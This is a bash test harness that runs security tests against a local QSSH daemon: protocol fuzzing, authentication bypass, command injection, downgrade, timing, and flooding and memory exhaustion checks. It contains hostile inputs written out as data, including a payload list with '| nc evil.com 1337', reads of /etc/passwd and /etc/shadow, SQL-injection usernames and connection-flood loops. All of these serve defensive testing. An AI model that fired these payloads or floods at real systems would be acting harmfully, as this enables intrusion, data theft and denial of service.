#!/bin/bash
# QSSH Security Test Orchestrator
# Run comprehensive security tests against QSSH

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

PORT=${QSSH_TEST_PORT:-22222}
QSSHD_PID=""

echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}          QSSH Security Test Suite v1.0                 ${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
echo ""

# Function to start test QSSH daemon
start_qsshd() {
    echo -e "${YELLOW}Starting QSSH daemon on port $PORT...${NC}"

    # Generate test host keys if needed
    if [ ! -f ~/.qssh/test_host_key ]; then
        mkdir -p ~/.qssh
        ./target/debug/qssh-keygen -t falcon512 -f ~/.qssh/test_host_key --host-key -y
    fi

    # Start daemon in background
    ./target/debug/qsshd -l "127.0.0.1:$PORT" --host-key ~/.qssh/test_host_key \
        -v 2>/tmp/qsshd_test.log &
    QSSHD_PID=$!

    sleep 2

    if kill -0 $QSSHD_PID 2>/dev/null; then
        echo -e "${GREEN}✓ QSSH daemon started (PID: $QSSHD_PID)${NC}"
    else
        echo -e "${RED}✗ Failed to start QSSH daemon${NC}"
        exit 1
    fi
}

# Function to stop test daemon
stop_qsshd() {
    if [ ! -z "$QSSHD_PID" ]; then
        echo -e "${YELLOW}Stopping QSSH daemon...${NC}"
        kill $QSSHD_PID 2>/dev/null || true
        wait $QSSHD_PID 2>/dev/null || true
    fi
}

# Cleanup on exit
trap stop_qsshd EXIT

# Build if needed
if [ ! -f ./target/debug/qssh ] || [ ! -f ./target/debug/qsshd ]; then
    echo -e "${YELLOW}Building QSSH...${NC}"
    cargo build --bins
fi

# Start daemon
start_qsshd

echo ""
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}                    FUZZING TESTS                       ${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"

# Protocol fuzzing
echo -e "\n${YELLOW}1. Protocol Fuzzing${NC}"
python3 - << 'EOF'
import socket
import random
import time

print("  → Testing malformed SSH banners...")
test_banners = [
    b"SSH-2.0-Evil\r\n",
    b"SSH-1.99-Legacy\r\n",
    b"NOT_SSH\r\n",
    b"SSH-2.0-" + b"A" * 10000 + b"\r\n",
    b"\x00" * 100,
    b"SSH-2.0-\x00\x01\x02\x03\r\n"
]

for i, banner in enumerate(test_banners):
    try:
        s = socket.socket()
        s.settimeout(1)
        s.connect(("127.0.0.1", 22222))
        s.send(banner)
        response = s.recv(1024)
        print(f"    Test {i+1}: Server survived, responded")
        s.close()
    except Exception as e:
        print(f"    Test {i+1}: {type(e).__name__}")
    time.sleep(0.1)
EOF

# Key exchange fuzzing
echo -e "\n${YELLOW}2. Key Exchange Fuzzing${NC}"
for i in {1..5}; do
    SIZE=$((RANDOM % 65536))
    echo "  → Sending $SIZE byte random KEX packet..."
    head -c $SIZE /dev/urandom | nc -w 1 127.0.0.1 $PORT 2>/dev/null || true
done

echo ""
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}                 PENETRATION TESTS                      ${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"

# Authentication bypass attempts
echo -e "\n${YELLOW}3. Authentication Bypass Tests${NC}"
USERS=("root" "admin" "" "' OR '1'='1" "\$(id)" "../../etc/passwd")
PASSES=("" "admin" "password" "' OR '1'='1")

for user in "${USERS[@]}"; do
    for pass in "${PASSES[@]}"; do
        echo -n "  → Testing user='$user' pass='$pass'... "
        timeout 1 sshpass -p "$pass" \
            ./target/debug/qssh -o StrictHostKeyChecking=no \
            "${user}@127.0.0.1" -p $PORT exit 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${RED}BYPASSED!${NC}"
            echo -e "${RED}CRITICAL: Auth bypass with user='$user' pass='$pass'${NC}"
        else
            echo -e "${GREEN}Blocked${NC}"
        fi
    done
done

# Command injection
echo -e "\n${YELLOW}4. Command Injection Tests${NC}"
PAYLOADS=(
    "\`id\`"
    "\$(whoami)"
    "; cat /etc/passwd"
    "| nc evil.com 1337"
    "../../../etc/shadow"
)

for payload in "${PAYLOADS[@]}"; do
    echo -n "  → Testing payload: '$payload'... "
    timeout 1 ./target/debug/qssh \
        -o StrictHostKeyChecking=no \
        "test@127.0.0.1" -p $PORT \
        "$payload" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${RED}Executed!${NC}"
    else
        echo -e "${GREEN}Blocked${NC}"
    fi
done

echo ""
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}                 QUANTUM ATTACK TESTS                   ${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"

# Quantum downgrade attacks
echo -e "\n${YELLOW}5. Quantum Downgrade Attacks${NC}"
DOWNGRADES=("none" "rsa" "classical" "des" "md5")

for algo in "${DOWNGRADES[@]}"; do
    echo -n "  → Attempting downgrade to '$algo'... "
    OUTPUT=$(timeout 1 ./target/debug/qssh \
        --pq-algo "$algo" \
        -o StrictHostKeyChecking=no \
        test@127.0.0.1 -p $PORT 2>&1 || true)

    if echo "$OUTPUT" | grep -qi "classical\|rsa\|des"; then
        echo -e "${RED}DOWNGRADED!${NC}"
    else
        echo -e "${GREEN}Prevented${NC}"
    fi
done

# Key reuse detection
echo -e "\n${YELLOW}6. Quantum Key Reuse Detection${NC}"
KEY_HASHES=()
for i in {1..5}; do
    echo -n "  → Connection $i: "
    OUTPUT=$(timeout 2 ./target/debug/qssh -vvv \
        -o StrictHostKeyChecking=no \
        test@127.0.0.1 -p $PORT exit 2>&1 || true)

    # Extract session key info if available
    KEY=$(echo "$OUTPUT" | grep -i "session.*key\|shared.*secret" | head -1 | md5sum | cut -d' ' -f1)

    if [ ! -z "$KEY" ]; then
        if [[ " ${KEY_HASHES[@]} " =~ " ${KEY} " ]]; then
            echo -e "${RED}KEY REUSED!${NC}"
        else
            echo -e "${GREEN}New key${NC}"
            KEY_HASHES+=("$KEY")
        fi
    else
        echo "No key info"
    fi
done

echo ""
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}                  TIMING ATTACKS                        ${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"

echo -e "\n${YELLOW}7. User Enumeration Timing${NC}"
for user in root admin qsshtest xyz123; do
    echo -n "  → Testing user '$user': "

    # Measure 3 attempts
    TIMES=()
    for j in {1..3}; do
        START=$(date +%s%N)
        timeout 1 sshpass -p wrongpass \
            ./target/debug/qssh "${user}@127.0.0.1" -p $PORT 2>/dev/null || true
        END=$(date +%s%N)
        ELAPSED=$((($END - $START) / 1000000))  # Convert to ms
        TIMES+=($ELAPSED)
    done

    # Calculate average
    AVG=$(( (${TIMES[0]} + ${TIMES[1]} + ${TIMES[2]}) / 3 ))
    echo "${AVG}ms avg"
done

echo ""
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}              RESOURCE EXHAUSTION TESTS                 ${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"

# Connection flooding
echo -e "\n${YELLOW}8. Connection Flooding${NC}"
echo -n "  → Opening connections: "
PIDS=()
for i in {1..100}; do
    ( nc -w 300 127.0.0.1 $PORT 2>/dev/null & )
    PIDS+=($!)

    if [ $((i % 10)) -eq 0 ]; then
        echo -n "$i "
    fi

    # Check if daemon still alive
    if ! kill -0 $QSSHD_PID 2>/dev/null; then
        echo -e "\n  ${RED}✗ Daemon crashed after $i connections!${NC}"
        break
    fi
done
echo ""

# Kill flood connections
for pid in "${PIDS[@]}"; do
    kill $pid 2>/dev/null || true
done

# Check if daemon recovered
sleep 2
if kill -0 $QSSHD_PID 2>/dev/null; then
    echo -e "  ${GREEN}✓ Daemon survived flooding${NC}"
else
    echo -e "  ${RED}✗ Daemon did not recover${NC}"
    start_qsshd  # Restart for remaining tests
fi

# Memory exhaustion
echo -e "\n${YELLOW}9. Memory Exhaustion${NC}"
for SIZE in 1048576 10485760 104857600; do
    SIZE_MB=$((SIZE / 1048576))
    echo -n "  → Sending ${SIZE_MB}MB packet... "

    dd if=/dev/zero bs=$SIZE count=1 2>/dev/null | \
        nc -w 1 127.0.0.1 $PORT 2>/dev/null || true

    if kill -0 $QSSHD_PID 2>/dev/null; then
        echo -e "${GREEN}Survived${NC}"
    else
        echo -e "${RED}Crashed!${NC}"
        start_qsshd
    fi
done

echo ""
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}                    TEST SUMMARY                        ${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════${NC}"

# Check daemon logs for issues
echo -e "\n${YELLOW}Checking daemon logs for issues...${NC}"
if [ -f /tmp/qsshd_test.log ]; then
    ERRORS=$(grep -c "ERROR\|CRITICAL\|PANIC" /tmp/qsshd_test.log || echo 0)
    WARNINGS=$(grep -c "WARN" /tmp/qsshd_test.log || echo 0)

    echo "  Errors: $ERRORS"
    echo "  Warnings: $WARNINGS"

    if [ $ERRORS -gt 0 ]; then
        echo -e "\n${RED}Critical errors found in logs:${NC}"
        grep "ERROR\|CRITICAL\|PANIC" /tmp/qsshd_test.log | head -5
    fi
fi

echo -e "\n${GREEN}Security test suite completed!${NC}"
echo "Full daemon logs available at: /tmp/qsshd_test.log"